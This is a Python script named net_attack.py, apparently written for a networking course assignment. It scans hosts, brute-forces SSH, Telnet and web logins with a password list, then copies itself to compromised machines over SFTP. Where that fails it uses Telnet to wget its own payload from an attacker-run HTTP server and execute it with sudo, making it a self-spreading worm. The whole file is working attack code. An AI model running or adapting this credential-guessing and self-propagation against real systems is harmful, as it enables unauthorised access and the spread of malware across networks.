#!/usr/bin/python3

from scapy.all import *
from os import path
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, SFTPClient, SSHException, AuthenticationException
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help()

    ip_file = arguments[arguments.index("-t") + 1]
    verify_file_exists(ip_file)

    ip_list = read_file_from_list(ip_file)
    print("[+] Determining which IP addresses are reachable...")

    ip_list = [ip for ip in ip_list if is_reachable(ip)]
    if not ip_list:
        print("[!] No reachable IP addresses found from the provided list")
        exit()

    ports = arguments[arguments.index("-p") + 1]
    port_list = get_ports_from_input(ports)

    username = arguments[arguments.index("-u") + 1]
    password_file = arguments[arguments.index("-f") + 1]
    verify_file_exists(password_file)
    password_list = read_file_from_list(password_file)

    if "-d" in arguments:
        deployment_file = arguments[arguments.index("-d") + 1]
        deploy_file_to_server(deployment_file)

    if "-L" in arguments and "-P" in arguments:
        scan_for_active_ips()

    deployed = False
    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                bruteforce_function = {
                    22: bruteforce_ssh,
                    23: bruteforce_telnet,
                    80: bruteforce_web,
                    8080: bruteforce_web,
                    8888: bruteforce_web
                }[port]

                username_password = bruteforce_function(ip, port, username, password_list)
                if username_password:
                    print("Successfully logged into port %d with %s" % (port, username_password))
                    if port == 22 or port == 23 and not deployed:
                        credentials = username_password.split(":")
                        deployed = transfer_file(ip, credentials[0], credentials[1], False, 23)

        print("********** %s **********\n" % ip)


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_telnet(ip, port, username, passwords):
    response = ""

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")
    exit_command = encode_in_ascii("exit\n")

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            connection.write(exit_command)
            connection.close()
            response = "%s:%s" % (username, password)
            break

        connection.close()

    return response


def bruteforce_ssh(ip, port, username, passwords):
    response = ""
    for password in passwords:
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port, timeout=3)
            response = "%s:%s" % (username, password)
            break
        except:
            print("Unable to establish SSH connection")

        client.close()

    return response


def bruteforce_web(ip, port, username, passwords):
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        index_response = get(index_url)
        if index_response.status_code == 200:
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


def read_file_from_list(file):
    file_contents_list = []
    with open(file) as reader:
        file_contents_list = reader.read().splitlines()

    return file_contents_list


def is_reachable(ip):
    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
    return ans is not None


def transfer_file(ip, username, password, overwrite_existing, port):
    successful = False
    target_directory = get_target_directory(ip, username)

    if port == 22:
        successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing)
    elif port == 23:
        if scan_port(ip, 22):
            try:
                successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing)
            except:
                print("Using HTTP")
                successful = transfer_file_with_http_server(ip, username, password, target_directory,
                                                            overwrite_existing, "")

        else:
            successful = transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing,
                                                        "")

    return successful


def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing):
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        with client.open_sftp() as sftp_client:
            deployment_filename = ".deploy"
            script_filename = "net_attack.py"

            local_dir = os.getcwd()

            local_deployment_path = "%s/%s" % (local_dir, deployment_filename)
            local_script_path = "%s/%s" % (local_dir, script_filename)
            target_deployment_path = "%s/%s" % (target_directory, deployment_filename)
            target_script_path = "%s/%s" % (target_directory, script_filename)

            sftp_client.chdir(target_directory)
            dir_contents = sftp_client.listdir()
            if deployment_filename not in dir_contents or overwrite_existing:
                sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
                sftp_client.put(localpath=local_script_path, remotepath=target_script_path)
                sftp_client.chmod(target_script_path, mode=777)

            return True
    except Exception as ex:
        print(ex)
        return False
    finally:
        client.close()


def transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing, self_propagate):
    telnet_port = 23

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    password_input = encode_in_ascii("%s\n" % password)
    welcome_output = encode_in_ascii("Welcome to")

    sudo_check = encode_in_ascii("id\n")
    sudo_check_response = encode_in_ascii("27(sudo)")

    wait_for = encode_in_ascii("saved")
    cd_command = encode_in_ascii("cd %s\n" % target_directory)
    # file_exists_command = encode_in_ascii("[ -f .deploy ] && echo ")
    remove_old_file_if_exists_command = encode_in_ascii("[ -f .deploy ] && rm .deploy\n")
    wget_deployment_file_command = encode_in_ascii("[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy -q\n")
    wget_script_file_command = encode_in_ascii("[ ! -f net_attack.py ] && wget 10.0.0.1:54325/net_attack.py -q\n")

    chmod_command = encode_in_ascii("sudo chmod +x net_attack.py\n")
    sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
    start_net_attack_command = encode_in_ascii("sudo ./net_attack.py -n \n")

    connection = Telnet(ip, port=telnet_port)
    try:
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(password_input)
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output not in banner:
            return False

        connection.write(sudo_check)
        check = connection.read_until(sudo_check_response, timeout=1)
        if sudo_check_response not in check:
            return False

        connection.write(cd_command)
        if overwrite_existing:
            connection.write(remove_old_file_if_exists_command)
        connection.write(wget_deployment_file_command)
        connection.write(wget_script_file_command)
        connection.read_until(wait_for, timeout=1)

        connection.write(chmod_command)
        sudo_response = connection.read_until(sudo_prompt, timeout=1)
        if sudo_prompt in sudo_response:
            connection.write(password_input)
            connection.read_until(encode_in_ascii("WAIT_FOR"), timeout=1)
        connection.write(start_net_attack_command)
        out = connection.read_until(encode_in_ascii("password.txt"), timeout=5)
        print(out)
    except:
        return False
    finally:
        connection.close()


# def start_ssh_with_telnet_if_not_running(ip, port, username, password):
#     ssh_port = 22
#     if scan_port(ip, ssh_port):
#         return True
#
#     login_prompt = encode_in_ascii("login:")
#     username_input = encode_in_ascii("%s\n" % username)
#     password_prompt = encode_in_ascii("Password:")
#     password_input = encode_in_ascii("%s\n" % password)
#     welcome_output = encode_in_ascii("Welcome to")
#
#     sudo_check = encode_in_ascii("id")
#     sudo_check_response = "27(sudo)"
#     start_sshd = encode_in_ascii("sudo service sshd start\n")
#     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
#
#     connection = Telnet(ip, port=port)
#     try:
#         connection.read_until(login_prompt)
#         connection.write(username_input)
#         connection.read_until(password_prompt)
#         connection.write(password_input)
#         banner = connection.read_until(welcome_output, timeout=1)
#         if welcome_output not in banner:
#             return False
#
#         connection.write(sudo_check)
#         check = connection.read_until(sudo_check_response, timeout=1)
#         if sudo_check_response not in check:
#             return False
#
#         connection.write(start_sshd)
#         start_sshd = connection.read_until(sudo_prompt, timeout=1)
#         if sudo_prompt in start_sshd:
#             connection.write(encode_in_ascii("%s\n" % password))
#             connection.read_until(encode_in_ascii("WAITING TO START"), timeout=5)
#     except Exception as ex:
#         print(ex)
#         return False
#     finally:
#         connection.close()
#
#     return True


def deploy_file_to_server(file):
    current_directory = os.getcwd()

    script_name = "net_attack.py"
    deployment_file_name = ".deploy"

    current_deployment_file_location = "%s/%s" % (current_directory, file)
    current_script_file_location = "%s/%s" % (current_directory, script_name)

    deployment_directory = "%s/net_attack_deployment" % current_directory

    if path.isdir(deployment_directory):
        rmtree(deployment_directory)

    os.mkdir(deployment_directory)
    os.chdir(deployment_directory)

    copyfile(current_deployment_file_location, deployment_file_name)
    copyfile(current_script_file_location, script_name)

    server = ("", 54325)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    ports.sort()
    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def get_target_directory(ip, username):
    ip_octals = ip.split(".")
    server_number = int(ip_octals[3]) - 1
    return "/home/%s/assign_2/server_%d" % (username, server_number)


def scan_for_active_ips():
    interfaces = get_if_list()
    print(interfaces)
    # Do Stuff


def encode_in_ascii(s):
    return s.encode("ascii")


def help():
    print("Example usage: ./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    exit()


if __name__ == "__main__":
    main()
